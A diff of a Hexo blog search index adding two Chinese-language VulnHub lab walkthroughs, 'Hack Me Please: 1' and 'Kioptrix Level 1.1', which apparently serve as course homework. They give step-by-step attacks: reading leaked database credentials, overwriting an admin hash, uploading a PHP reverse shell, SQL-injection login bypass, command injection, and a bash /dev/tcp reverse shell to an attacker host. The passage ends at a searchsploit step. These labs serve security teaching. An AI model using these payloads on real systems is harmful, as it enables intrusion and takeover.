@@ -1,21 +1,455 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2024/11/28/hello-world/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+    <title>HACK ME PLEASE: 1</title>
+    <url>/2024/11/30/HACK-ME-PLEASE-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link"   href="https://www.vulnhub.com/entry/hack-me-please-1,731/" >靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Description</strong><br>Difficulty: Easy<br>Description: An easy box totally made for OSCP. No bruteforce is required.<br>Aim: To get root shell</p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (Virtualbox - OVA)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+<h3 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h3><ul>
+<li><a class="link"   href="https://blog.pulipuli.info/2016/07/virtualbox-how-to-import-ovf-format.html" >匯入 Virtualbox<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://zhuanlan.zhihu.com/p/554893004" >虛擬機配置不同網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://www.youtube.com/live/sGkwmjppU8U?feature=share" >教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>
+<br></li>
+</ul>
+<h3 id="步驟一：找出目標"><a href="#步驟一：找出目標" class="headerlink" title="步驟一：找出目標"></a>步驟一：找出目標</h3><p>請使用 netdiscovery 或類似工具，找出靶機的 IP 位址。</p>
+<p><strong>netdiscover</strong>： <a class="link"   href="https://blog.csdn.net/u010698107/article/details/115288643" >1<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link"   href="https://www.tw511.com/24/273/9855.html" >2<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、 <a class="link"   href="https://ithelp.ithome.com.tw/articles/10274282?sc=hot" >3<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、 <a class="link"   href="https://zhuanlan.zhihu.com/p/423742743" >4<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/B1oTJbIw2.png"
+                     
+                ></p>
+<br>
+<br>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+<h3 id="步驟二：通訊埠掃描"><a href="#步驟二：通訊埠掃描" class="headerlink" title="步驟二：通訊埠掃描"></a>步驟二：通訊埠掃描</h3><p>請使用 nmap 或類似工具，找出靶機的所有通訊埠。<br>提示：雖然建議大家平常不要用 Aggressive Scan, 但做作業可以喔。<br>你應該至少會掃出 port 80 跟 3306，想想它們是甚麼服務。</p>
+<p><strong>NMAP</strong>：<a class="link"   href="https://www.osslab.tw/books/linux-administration/page/nmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E9%9B%86" >1<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link"   href="https://www.oreilly.com/library/view/nmap-network-exploration/9781786467454/916fdbc5-6ae2-4f8b-a5a2-c2515309daad.xhtml" >2<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/ByTWyMUD2.png"
+                     
+                ></p>
+<br>
+<br>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+<h3 id="網頁伺服器列舉"><a href="#網頁伺服器列舉" class="headerlink" title="網頁伺服器列舉"></a>網頁伺服器列舉</h3><p>連上網頁看看，順道用瀏覽器把網頁原始檔打開瞧瞧，如果本身網頁沒有問題，看看他 include 了那些外部檔案，特別是 JavaScript 的，如果你留意到了 js&#x2F;main.js，請把他打開，找到以下內容<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/S1764G8D3.png"
+                     
+                ><br>SeedDMS 是甚麼？它是一個開源的，使用 PHP 與 MySQL 搭建的網頁化文件管理器，在更新文件時提供工作流管理和通知。它的套件檔於下面連結，目前已發行到 6.0.x 版本。<br><a class="link"   href="https://sourceforge.net/p/seeddms/code/ci/seeddms-6.0.x/tree/" >https://sourceforge.net/p/seeddms/code/ci/seeddms-6.0.x/tree/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>而我們看到的版本是 5.1.22，版本有點舊，那就有機會。到 exploit-db 輸入 SeedDMS 找找看<br><a class="link"   href="https://www.exploit-db.com/" >https://www.exploit-db.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>遇到找不到原始套件的，可以用網站映射工具，從目標主機抓下來慢慢看。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/By4SSMLPn.png"
+                     
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/H1OyLGUPn.png"
+                     
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SykTPfUv2.png"
+                     
+                ></p>
+<br>
+<br>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="步驟四：套件查看"><a href="#步驟四：套件查看" class="headerlink" title="步驟四：套件查看"></a>步驟四：套件查看</h3><p>很遺憾的，它最後的 Cross-Site Scripting 與 RCE Bug 都在 5.1.18 以後就不存在了。那只好來找找，有沒有設定上的疏失吧。從前面的連結，你應該可以找到 5.1.22 版的目錄</p>
+<p><a class="link"   href="https://sourceforge.net/p/seeddms/code/ci/5.1.22/tree/" >https://sourceforge.net/p/seeddms/code/ci/5.1.22/tree/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>哪個路徑看起來像是設定檔存放的地方？就是那個 conf。打開看一下裡面有啥：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/H1JFFM8wn.png"
+                     
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/r1gboM8wh.png"
+                     
+                ></p>
+<p>步驟三跟你說套件會裝在 &#x2F;seeddms51x&#x2F;seeddms-5.1.22&#x2F; 下，那就試試用瀏覽器查看一下以下連結</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/seeddms-5.1.22/conf/</span><br><span class="line">http://10.0.2.15/seeddms51x/seeddms-5.1.22/conf/</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/B1IGaz8wn.png"
+                     
+                ></p>
+<p>也可能是去掉子版本的路徑</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/conf/</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/B1RQpMIP2.png"
+                     
+                ></p>
+<p>哎呀，可惜管理員把 Directory Traversal 功能關掉了，不然就看的到設定檔了。不過，有沒有發現兩個的錯誤訊息不同，一個是 404 File not found，一個是403 Forbidden。想想哪個是存在的呦。繼續回到 sourceforge 上查看。</p>
+<br>
+<br>
+
+<h3 id="步驟五：套件分析"><a href="#步驟五：套件分析" class="headerlink" title="步驟五：套件分析"></a>步驟五：套件分析</h3><p>&#x2F;conf 裡面有啥？<br> &ensp;     .htaccess<br> &ensp;     settings.xml.template<br> &ensp;    stopwords.txt<br>stopwords.txt 是個字典檔，沒太多用途；<br>settings.xml.template 嘛…往下看，大概到了中間偏後一點點的地方，What!!!<br>竟然要設定 dbUser 跟 dbPass，好傢伙，有戲了。但實際檔案連結呢？<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJEvCELw3.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/Byku1r8Dn.png"
+                     
+                ></p>
+<p>再看到 .htaccess<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJX5kHLv3.png"
+                     
+                ></p>
+<p>有沒有看到上面的註解？bingo，找到設定檔的預設路徑了。<br>串起前面 403 錯誤的 URL 前綴：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/conf/settings.xml</span><br><span class="line">http://10.0.2.15/seeddms51x/conf/settings.xml</span><br></pre></td></tr></table></figure></div>
+<p>What a wonderful world! 有沒有看到資料庫的設定了。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/H1zDeHUPn.png"
+                     
+                ></p>
+<br>
+<br>
+
+<h3 id="步驟六：連上資料庫看看"><a href="#步驟六：連上資料庫看看" class="headerlink" title="步驟六：連上資料庫看看"></a>步驟六：連上資料庫看看</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="operator">&lt;</span>CTF_Machine_IP<span class="operator">&gt;</span> <span class="operator">-</span>u <span class="operator">&lt;</span>dbUser<span class="operator">&gt;</span> <span class="operator">-</span>p</span><br><span class="line">mysql <span class="operator">-</span>h <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> <span class="operator">-</span>u seeddms <span class="operator">-</span>p</span><br></pre></td></tr></table></figure></div>
+<p>到處看看</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES;</span><br></pre></td></tr></table></figure></div>
+<p>有一個 seeddms 資料庫</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">USE seeddms;</span><br><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure></div>
+<p>所有表格都是 tbl 開頭，只有一個 users 不是，很有可能就是管理者的資料</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure></div>
+<p>暫時沒有用，不管，先記下來再說。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rJ4brH8D2.png"
+                     
+                ></p>
+<p>從 tbl 系列中，又看到跟使用者有關的 tblusers 資料表。</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tblusers;</span><br></pre></td></tr></table></figure></div>
+<p>看到前台的兩個帳號了，guest 沒密碼不能登入，權限可能也不夠，admin 的權<br>限比較香。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJ9GrSIv2.png"
+                     
+                ><br>pwd 欄位長度 32 個字元，我們學過的雜湊演算法中，應該就是 MD5 了。</p>
+<br>
+<br>
+
+<h3 id="步驟七：密碼破解"><a href="#步驟七：密碼破解" class="headerlink" title="步驟七：密碼破解"></a>步驟七：密碼破解</h3><ul>
+<li><p>方法一：課堂教過 John the ripper，你可以建字典檔，或用暴力法破解它。</p>
+<ul>
+<li>John the ripper：<a class="link"   href="https://ithelp.ithome.com.tw/articles/10300529" >1<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+</li>
+<li><p>方法二：沒猜到密碼怎麼辦？改掉它，或是自己加一個。這只講改掉的流程，insert 的指令太長不打了。使用 md5sum 工具或網頁的MD5 生成工具，把你要的密碼雜湊成 MD5。</p>
+<p>  再來就是直接覆蓋資料庫了。</p>
+  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> tblUsers</span><br><span class="line"><span class="keyword">SET</span> pwd<span class="operator">=</span><span class="string">&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> login<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+<p>  注意：pwd 的字串記得改成你自己的。</p>
+<p>  123456的MD5：</p>
+  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure></div>
+<p>  <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rJswJ8Ivn.png"
+                     
+                ></p>
+</li>
+</ul>
+<br>
+<br>
+
+<h3 id="步驟八：登入前台"><a href="#步驟八：登入前台" class="headerlink" title="步驟八：登入前台"></a>步驟八：登入前台</h3><p>可以去登入看看了，根據原始檔案說明，應該在這</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/seeddms-5.1.22/</span><br><span class="line">http://10.0.2.15/seeddms51x/seeddms-5.1.22/</span><br></pre></td></tr></table></figure></div>
+<p>看一下你的身分<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJJkgLIDn.png"
+                     
+                ></p>
+<br>
+<br>
+
+<h3 id="步驟九：上傳反向後門"><a href="#步驟九：上傳反向後門" class="headerlink" title="步驟九：上傳反向後門"></a>步驟九：上傳反向後門</h3><p>既然它是 PHP&#x2F;MySQL，我們就利用上傳功能，建立一個 php 反向後門來玩吧，從這邊下載人家寫好的 PHP webshell 工具：<br><a class="link"   href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell" >https://pentestmonkey.net/tools/web-shells/php-reverse-shell<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>記得根據你攻擊端的 ip 與 port 修改檔案。</p>
+<p>Kali 端就不用複雜的 metasploit 了，簡單用 netcat 開個接口就夠用了</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -v -n -l -p 1234</span><br></pre></td></tr></table></figure></div>
+<p>-p 後面是你剛剛指定的 port 喔。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJukXULvn.png"
+                     
+                ></p>
+<p>接著，從網頁的 Add Document，建立一份新文件，把剛剛 webshell 改好的php 檔上傳吧。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJYgVUUv2.png"
+                     
+                ></p>
+<br>
+<br>
+
+
+<h3 id="步驟十：執行反向後門"><a href="#步驟十：執行反向後門" class="headerlink" title="步驟十：執行反向後門"></a>步驟十：執行反向後門</h3><p>上傳後的檔案，可以點擊下載，但好像無法執行怎麼辦？<br>繼續追蹤原始碼，裡面上傳的儲存位置，會在以下預設路徑</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://site.example.com/data/1048576/&lt;document_id&gt;/1.php</span><br></pre></td></tr></table></figure></div>
+<p><document_id> 可以從下載的 URL 中找到，而此機器的套件裝在<br>seeddms51x 目錄下，所以 URL 成了以下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;CTF_Machine_IP&gt;/seeddms51x/data/1048576/&lt;document_id&gt;/1.php</span><br><span class="line">http://10.0.2.15/seeddms51x/data/1048576/8/1.php</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJpuUIIPn.png"
+                     
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJmtILUw2.png"
+                     
+                ></p>
+<p>執行一下它吧，看看 kali 上的 nc 是否接上了，</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/B11HP8Iwh.png"
+                     
+                ></p>
+<p>需要更多功能請參考<br><a class="link"   href="https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/" >https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<br>
+<br>
+
+<h3 id="步驟十一：越權"><a href="#步驟十一：越權" class="headerlink" title="步驟十一：越權"></a>步驟十一：越權</h3><p>你現在是已 www-data 身分進入系統，習慣上查一下 &#x2F;etc&#x2F;passwd，發現有個使用者帳號 saket。ㄟ….跟剛剛 users 資料表的一樣耶。那就</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">which python3</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; #這步驟很重要，一般terminal無法輸入sudo密碼</span><br><span class="line">cd /etc</span><br><span class="line">cat passwd</span><br><span class="line">su - saket</span><br><span class="line"><span class="meta prompt_">Saket@#</span><span class="language-bash"><span class="variable">$1337</span></span></span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/Sk62uUIvn.png"
+                     
+                ></p>
+<p>密碼貼過來，WTF，進去了。再 try try 管理者是否是預設第一個帳號擁有sudo 的權限(Ubuntu 的特性)。</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line"><span class="meta prompt_">Saket@#</span><span class="language-bash"><span class="variable">$1337</span></span></span><br></pre></td></tr></table></figure></div>
+<p>密碼再貼一次。<br>恭喜恭喜恭喜你!!!!! 確認一下準備收工了</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJDLPw8vn.png"
+                     
+                ></p>
+<p>這就是簡易的 CTF，因為是靶機，沒有必要刪除軌跡，所以就結束囉。</p>
 ]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>KIOPTRIX: LEVEL 1.1</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Description</strong><br>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
+
+<h2 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a><strong>前置工作</strong></h2><ul>
+<li>匯入 VMware</li>
+<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
+<li><a class="link" href="https://youtu.be/vWQWikIR4Xw?si=F1F5dTH6T0kh-1ix">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkmCJdoFT.png" alt="image"></li>
+</ul>
+<br>
+<br>
+
+<h2 id="步驟一、找到其服務"><a href="#步驟一、找到其服務" class="headerlink" title="步驟一、找到其服務"></a>步驟一、找到其服務</h2><p>首先，先使用<code>ifconfig</code>查看自己的IP。<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1C5JOsK6.png" alt="image"></p>
+<p>使用netdiscover查看本地端的IP尋找靶機。<br><code>sudo netdiscover -r 192.168.0.0/24</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkAGeuoYa.png" alt="image"></p>
+<p>使用nmap查看其服務。<br><code>sudo nmap -A -T4 192.168.0.9</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyhIe_jF6.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟二、尋找進入點"><a href="#步驟二、尋找進入點" class="headerlink" title="步驟二、尋找進入點"></a>步驟二、尋找進入點</h2><p>因為有http與https服務，所以網址列<code>http://192.168.0.9/</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyVGfOiKa.png" alt="image"></p>
+<p>檢視頁面來源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B14jGuoKa.png" alt="image"></p>
+<p>嘗試使用 <a class="link" href="https://stackoverflow.com/questions/53688134/what-is-the-meaning-of-admin-or-1-1">SQL Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，在Username輸入：<br><code> ' or 1=1#</code> 或<code>admin' or '1'='1'/*</code>或<code>admin' #</code>或<code>admin' or 1=1-- </code>。<br><code>admin' --</code>與<code>admin' or 1=1--</code>實作無效，因為<code>--</code>後面需要空格。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyNWCciFT.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟三、RCE-Remote-Code-Execution"><a href="#步驟三、RCE-Remote-Code-Execution" class="headerlink" title="步驟三、RCE(Remote Code Execution)"></a>步驟三、RCE(Remote Code Execution)</h2><p>進入後會得到一個ping頁面。<br>127.0.0.1（本地主機）。<br>透過RCE尋找有用資訊並控制。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByVmXjiYp.png" alt="image"></p>
+<p><code>ping 127.0.0.1;pwd</code>或<code>ping 127.0.0.1|pwd</code>。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJAFmsjFT.png" alt="image"></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkyYXosFp.png" alt="image"></p>
+<p><code>ping 127.0.0.1|ls</code>。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvpXsjF6.png" alt="image"><br><br></p>
+<p>參考 <a class="link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br>與自己建立了一個 TCP 反向 shell 連接，將目標系統的<br>標準輸入、輸出和錯誤都與攻擊者的遠端位置相連接。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByeYzhjtT.png" alt="image"></p>
+<p>先打好<code>nc -nvlp 8888</code>送出再網頁輸入。<br><code>ping 127.0.0.1|bash -i &gt;&amp; /dev/tcp/192.168.0.8/8888 0&gt;&amp;1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HycNH2jKa.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkRfH3iKa.png" alt="image"></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJvJunsYa.png" alt="image"><br>LSB 的全稱是 “Linux Standard Base”（Linux 標準基準）。LSB 是一個開放標準，定義了 Linux 操作系統的核心元件和應用程式的標準接口，以確保不同 Linux 發行版之間的二進制兼容性。<br><br><br><br></p>
+<h2 id="步驟四、搜索漏洞"><a href="#步驟四、搜索漏洞" class="headerlink" title="步驟四、搜索漏洞"></a>步驟四、搜索漏洞</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit 2.6.9</span><br><span class="line">searchsploit CentOS 4.5</span><br></pre></td></tr></table></figure></div>
+<p>searchsploit 是 Exploit Database 中的一個工具，用於搜索漏洞利用程式（exploits）和Shellcode的資料庫。Exploit Database 是一個包含各種漏洞利用程式、Shellcode和相關資訊的公共資料庫，旨在協助渗透測試和安全研究。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rk2oYnjKp.png" alt="image"><br><br><br><br></p>
+<p><code>searchsploit -m linux_x86/local/9542.c</code></p>
